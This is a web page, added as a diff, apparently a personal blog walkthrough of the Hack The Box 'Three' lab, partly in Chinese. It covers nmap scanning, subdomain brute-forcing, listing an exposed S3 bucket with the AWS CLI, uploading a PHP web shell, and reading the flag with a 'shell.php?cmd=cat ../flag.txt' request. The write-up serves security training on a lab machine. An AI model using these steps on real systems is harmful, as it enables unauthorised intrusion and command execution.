@@ -1,0 +1,106 @@
+<!DOCTYPE html><html lang="en">
+	<!-- Power by astro.build, bulma.io and pages.cloudflare.com -->
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+		<link rel="stylesheet" href="/styles/global.css">
+		<link rel="stylesheet" href="/styles/code_theme.css">
+		<!-- <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script> -->
+		<title>[Hack The Box] [Starting Point] [Tier 1] Three | Versun</title>
+		<link rel="icon" type="image/x-icon" href="/avatar.jpg">
+	</head>
+	<body>
+			<nav class="tabs mb-4 has-background-warning">
+    
+    <ul>
+        <li><a class="has-text-black navbar-item" href="/">Home</a></li>
+    </ul>
+
+</nav><section>
+    <div class="container content" id="post">
+      <h2 class="subtitle">[Hack The Box] [Starting Point] [Tier 1] Three</h2>
+      <p><strong>TASK 1</strong></p>
+<p><strong>How many TCP ports are open?</strong> 2</p>
+<pre is:raw="" class="astro-code" style="background-color: #282c34; overflow-x: auto;"><code><span class="line"><span style="color: #abb2bf">$ nmap -sC -sT -sV $ip</span></span>
+<span class="line"><span style="color: #abb2bf">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 06:53 BST</span></span>
+<span class="line"><span style="color: #abb2bf">Nmap scan report for 10.129.218.174</span></span>
+<span class="line"><span style="color: #abb2bf">Host is up (0.24s latency).</span></span>
+<span class="line"><span style="color: #abb2bf">Not shown: 998 closed tcp ports (conn-refused)</span></span>
+<span class="line"><span style="color: #abb2bf">PORT   STATE SERVICE VERSION</span></span>
+<span class="line"><span style="color: #abb2bf">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span style="color: #abb2bf">| ssh-hostkey: </span></span>
+<span class="line"><span style="color: #abb2bf">|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)</span></span>
+<span class="line"><span style="color: #abb2bf">|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)</span></span>
+<span class="line"><span style="color: #abb2bf">|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)</span></span>
+<span class="line"><span style="color: #abb2bf">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span></span>
+<span class="line"><span style="color: #abb2bf">|_http-server-header: Apache/2.4.29 (Ubuntu)</span></span>
+<span class="line"><span style="color: #abb2bf">|_http-title: The Toppers</span></span>
+<span class="line"><span style="color: #abb2bf">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span>
+<span class="line"><span style="color: #abb2bf">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span>
+<span class="line"><span style="color: #abb2bf">Nmap done: 1 IP address (1 host up) scanned in 26.12 seconds</span></span></code></pre>
+<p><strong>TASK 2</strong></p>
+<p><strong>What is the domain of the email address provided in the “Contact” section of the website?</strong> thetoppers.htb</p>
+<p><strong>TASK 3</strong></p>
+<p><strong>In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</strong> /etc/hosts</p>
+<p><strong>TASK 4</strong></p>
+<p><strong>Which sub-domain is discovered during further enumeration?</strong> s3.thetoppers.htb</p>
+<p>将thetoppers.htb映射ip，写入到hosts文件中</p>
+<p>开始爆破子域名</p>
+<p><code>ffuf -u http://PARAM.thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-200000.txt:PARAM</code></p>
+<p>试了多个字典，都扫不出来</p>
+<p>使用gobuster dns模式也扫不出来</p>
+<p>使用gobuster vhost命令, 可以扫出来2个</p>
+<p>返回码404和400，，所以没扫出来</p>
+<p><img src="/images/c18c3302-3314-11ed-a39a-327ebed86db8/6d5f001f-d98e-4fb5-bded-d3fe43052db5.png" alt=""></p>
+<p><strong>TASK 5</strong></p>
+<p><strong>Which service is running on the discovered sub-domain?</strong> Amazon S3</p>
+<p><strong>TASK 6</strong></p>
+<p><strong>Which command line utility can be used to interact with the service running on the discovered sub-domain?</strong> awscli</p>
+<p><strong>TASK 7</strong></p>
+<p><strong>Which command is used to set up the AWS CLI installation?</strong> aws configure</p>
+<p><strong>TASK 8</strong></p>
+<p><strong>What is the command used by the above utility to list all of the S3 buckets?</strong> aws s3 ls</p>
+<p><strong>TASK 9</strong></p>
+<p><strong>This server is configured to run files written in what web scripting language?</strong> PHP</p>
+<p><strong>SUBMIT FLAG</strong></p>
+<p>将s3.thetoppers.htb也添加到hosts文件中</p>
+<p><code>10.129.230.68 thetoppers.htb s3.thetoppers.htb</code></p>
+<p>根据<a href="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html">aws文档</a>，安装awscli</p>
+<p>然后需要配置aws，随便输：<code>aws configure</code></p>
+<p>根据<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets">aws文档</a>可得以下命令: <code>aws s3 ls s3://thetoppers.htb</code></p>
+<p>但报错了：</p>
+<p><img src="/images/c18c3302-3314-11ed-a39a-327ebed86db8/ca9b0d9d-fda3-4850-9719-8f487d6aa3c1.png" alt=""></p>
+<p>通过错误信息可知，需要修改endpoint URL，根据<a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/ls.html">文档</a>可知参数为—endpoint-url</p>
+<p><img src="/images/c18c3302-3314-11ed-a39a-327ebed86db8/7161e1d1-c1a9-4b41-841c-74ebae27b251.png" alt=""></p>
+<p>那么接下来就是上传后门文件shell.php</p>
+<p><img src="/images/c18c3302-3314-11ed-a39a-327ebed86db8/77d27b99-531c-4b52-a8a9-c6a35433c880.png" alt=""></p>
+<p>然后通过<a href="https://www.w3cschool.cn/tools/index?name=urlencode_decode">url在线编码器</a>，编码命令就能得到flag了</p>
+<p><a href="http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt">http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt</a></p>
+<p><strong>Note:</strong></p>
+<p>ref:</p>
+<p>字典(dict) <a href="https://github.com/danielmiessler/SecLists">danielmiessler/SecLists</a></p>
+<p><a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html">Configuration basics - AWS Command Line Interface (amazon.com)</a></p>
+<p><a href="https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/">https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/</a>  <a href="https://www.amplenote.com/notes/876fd216-33df-11ed-a709-5ac3aea65f93">Note</a></p>
+<p><a href="/attachments/Three.pdf">Three.pdf</a></p>
+    </div>
+  </section><hr>
+<script src="https://giscus.app/client.js" data-repo="versun/Tiny-Website-by-Astro" data-repo-id="R_kgDOH8gn5w" data-category="Announcements" data-category-id="DIC_kwDOH8gn584CRQOD" data-mapping="title" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light_high_contrast" data-lang="en" crossorigin="anonymous" async>
+</script><footer class="container has-text-centered mt-6">
+  <span>
+    -<strong> 2022 · <a href="https://versun.me">Versun</a> · <a href="https://versun.me/rss.xml">rss</a></strong> -
+    <br>
+    Source code licensed <a href="https://mit-license.org/" target="_blank">MIT.</a>
+    <br>
+    Website content licensed <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>
+    <br>
+  </span>
+  <div style="color: transparent">
+    This is a honeypot:
+    <a href="mailto:2j9BV8WX3@versun.me" style="color: transparent">
+      2j9BV8WX3@versun.me
+    </a>
+    Please do not use it unless you are a spambot.
+  </div>
+</footer>
+	</body></html>
